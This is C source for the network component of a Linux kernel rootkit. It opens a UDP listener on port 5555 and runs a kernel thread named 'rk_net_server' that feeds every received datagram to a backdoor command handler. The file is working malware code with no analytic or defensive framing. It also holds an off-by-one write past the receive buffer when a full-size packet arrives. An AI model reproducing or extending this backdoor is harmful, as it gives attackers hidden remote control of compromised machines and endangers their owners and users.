#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/slab.h>
#include <net/sock.h>
#include "backdoor.h"
#include "netcom.h"

static struct socket *recv_sock = NULL;
static struct task_struct *server_thread = NULL;

#define SERVER_PORT 5555
#define BUF_SIZE 256

static int server_loop(void *arg) {
    struct sockaddr_in addr;
    int ret;
    struct msghdr msg = {0};
    struct kvec iov;
    char *buffer;

    buffer = kmalloc(BUF_SIZE, GFP_KERNEL);
    if (!buffer) return 0;

    allow_signal(SIGKILL);
    while (!kthread_should_stop()) {
        memset(buffer, 0, BUF_SIZE);
        iov.iov_base = buffer;
        iov.iov_len = BUF_SIZE;

        msg.msg_name = &addr;
        msg.msg_namelen = sizeof(addr);
        msg.msg_flags = 0;

        ret = kernel_recvmsg(recv_sock, &msg, &iov, 1, BUF_SIZE, msg.msg_flags);
        if (ret > 0) {
            buffer[ret] = '\0';
            handle_command(buffer);
        }
        if (signal_pending(current))
            break;
    }

    kfree(buffer);
    return 0;
}

int init_netcom(void) {
    struct sockaddr_in sin;
    int err;

    err = sock_create(AF_INET, SOCK_DGRAM, IPPROTO_UDP, &recv_sock);
    if (err < 0) {
        pr_err("rootkit: failed to create udp socket\n");
        return err;
    }

    memset(&sin, 0, sizeof(sin));
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = htonl(INADDR_ANY);
    sin.sin_port = htons(SERVER_PORT);

    err = kernel_bind(recv_sock, (struct sockaddr *)&sin, sizeof(sin));
    if (err < 0) {
        pr_err("rootkit: bind failed\n");
        sock_release(recv_sock);
        recv_sock = NULL;
        return err;
    }

    server_thread = kthread_run(server_loop, NULL, "rk_net_server");
    if (IS_ERR(server_thread)) {
        pr_err("rootkit: failed to start server thread\n");
        sock_release(recv_sock);
        recv_sock = NULL;
        return PTR_ERR(server_thread);
    }

    return 0;
}

void cleanup_netcom(void) {
    if (server_thread) {
        kthread_stop(server_thread);
        server_thread = NULL;
    }

    if (recv_sock) {
        sock_release(recv_sock);
        recv_sock = NULL;
    }
}
